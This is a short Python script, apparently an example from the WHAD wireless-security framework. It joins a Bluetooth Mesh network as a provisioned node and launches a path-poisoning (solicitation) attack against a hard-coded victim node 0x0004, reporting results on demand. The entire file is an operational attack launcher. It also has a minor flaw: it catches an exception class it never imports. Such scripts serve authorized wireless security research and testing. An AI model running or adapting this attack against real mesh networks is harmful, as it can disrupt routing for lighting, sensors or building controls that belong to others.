from whad.device import WhadDevice
from whad.ble.exceptions import ConnectionLostException
import sys
from whad.btmesh.connector.provisionee import Provisionee
from whad.btmesh.attacker.path_poison_solicitation import (
    PathPoisonSolicitationAttacker,
    PathPoisonSolicitationConfiguration,
)
from time import sleep
from whad.btmesh.stack.utils import MeshMessageContext


if len(sys.argv) != 2:
    # Retrieve target interface
    print("Usage: %s [provisionee]" % sys.argv[0])
    exit(1)


interface = sys.argv[1]

try:
    dev = WhadDevice.create(interface)

    provisionee = Provisionee(dev)
    provisionee.start()
    provisionee.profile.auto_provision()

    print("Node is (auto) provisioned !")

    # Create the attacker object and launch the attack
    attack_conf = PathPoisonSolicitationConfiguration()
    attack_conf.victim = 0x0004  # attack node 0x04

    attacker = PathPoisonSolicitationAttacker(connector=provisionee, configuration=attack_conf)

    print("Lauching the PathPoisonSolicitation attack...")
    attacker.launch(asynch=True)

    while True:
        input("Press any key and enter to get results. Ctrl-C to quit.")
        attacker.show_result()

except ConnectionLostException as e:
    print("Connection lost", e)

except (KeyboardInterrupt, SystemExit):
    dev.close()

except WhadDeviceNotFound:
    print("[e] Device not found")
    exit(1)
